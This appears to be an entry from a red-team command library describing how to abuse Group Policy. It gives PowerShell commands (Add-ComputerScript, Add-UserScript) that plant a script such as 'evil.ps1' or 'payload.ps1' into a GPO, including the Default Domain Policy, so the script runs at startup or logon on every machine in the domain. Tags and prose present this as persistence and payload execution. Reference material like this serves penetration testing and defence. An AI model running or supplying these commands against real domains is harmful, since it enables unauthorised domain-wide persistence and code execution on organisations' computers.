---
id: c68bb944-c98e-487a-81c8-19661e54d99e
name: add-script-to-gpo
type: command
executor: powershell
data: >-
  Add-ComputerScript -ScriptName $_SCRIPTNAME -ScriptContent $(Get-Content
  $_SCRIPTFILE) -GPOIdentity $_GPONAME
output: null
created_at: '2023-04-06T03:56:03.665044+00:00'
updated_at: '2023-10-10T20:26:15.994624+00:00'
platforms:
  - Windows
tags:
  - gpo-abuse
  - persistence
verified: true
validated: true
---

# add-script-to-gpo

## Command

```powershell
Add-ComputerScript -ScriptName $_SCRIPTNAME -ScriptContent $(Get-Content $_SCRIPTFILE) -GPOIdentity $_GPONAME
```

## Description

This command injects a script into a GPO for execution on computer startup (use Add-ComputerScript) or user logon (Add-UserScript). It embeds the script content directly, enabling persistence or payload execution domain-wide.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -ScriptName $_SCRIPTNAME | Name of the script as it appears in GPO (e.g., 'EvilScript') | Yes |
| -ScriptContent $(Get-Content $_SCRIPTFILE) | Content of the script file (e.g., evil.ps1) | Yes |
| -GPOIdentity $_GPONAME | The name of the GPO to modify (e.g., 'SuperSecureGPO') | Yes |

## Examples

### Basic Usage

```powershell
Add-ComputerScript -ScriptName 'EvilScript' -ScriptContent $(Get-Content evil.ps1) -GPOIdentity 'SuperSecureGPO'
```

### Advanced Usage

```powershell
Add-UserScript -ScriptName 'MaliciousLogon' -ScriptContent $(Get-Content payload.ps1) -GPOIdentity 'Default Domain Policy'
```

## Expected Output

Successful execution produces output like:

"Script 'EvilScript' added to computer startup in GPO 'SuperSecureGPO'."

File read errors or GPO issues will be reported.

## Related

- [[procedures/GPO-Abuse-with-PowerGPOAbuse]]
- [[commands/create-gpo-immediate-task]]
